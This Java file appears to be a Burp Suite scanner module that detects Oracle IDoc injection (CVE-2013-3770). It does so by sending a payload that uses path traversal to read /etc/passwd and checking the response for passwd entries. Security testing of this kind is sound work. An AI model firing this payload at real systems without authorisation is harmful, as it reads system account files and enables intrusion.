package burp.j2ee.issues.impl;


import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.issues.IModule;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 *
 * This module tries to inject custom idoc scripts.
 * 
 * 
 *
 * References:
 * http://docs.oracle.com/cd/E14571_01/doc.1111/e10726/toc.htm
 * http://unsecurityresearch.com/index.php?option=com_content&view=article&id=46:published-advisories&catid=34:published-advisories&Itemid=53
 * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3770
 * 
 * 
 */
public class IDocInjection implements IModule {

    private static final String TITLE = "IDoc Injection";
    private static final String DESCRIPTION = "The remote application is vulnerable to Oracle IDoc Injection"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://docs.oracle.com/cd/E14571_01/doc.1111/e10726/toc.htm<br />"
            + "http://unsecurityresearch.com/index.php?option=com_content&view=article&id=46:published-advisories&catid=34:published-advisories&Itemid=53<br />"
            + "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3770<br />";

    private static final List<Pattern> XINCLUDE_REGEX = Arrays.asList(
            Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private static final List<byte[]> EL_INJECTION_TESTS = Arrays.asList(
            "<$fileName=\"../../../../../../../../../../../etc/passwd\"$><$executeService(\"GET_LOGGED_SERVER_OUTPUT\")$><$ServerOutput$>".getBytes());

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        // Skip test for not j2ee applications
        if (!isJavaApplicationByURL(curURL)){
            return issues;            
        }

        for (byte[] INJ_TEST : EL_INJECTION_TESTS) {
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            // look for matches of our active check grep string
            String response = helpers.bytesToString(checkRequestResponse.getResponse());

            for (Pattern xincludeMatcher : XINCLUDE_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {

                // get the offsets of the payload within the request, for in-UI highlighting
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        "Install the patch provided by Oracle",
                        Risk.High,
                        Confidence.Certain
                ));
                
                    return issues;
                }

            }

        }

        return issues;
    }
}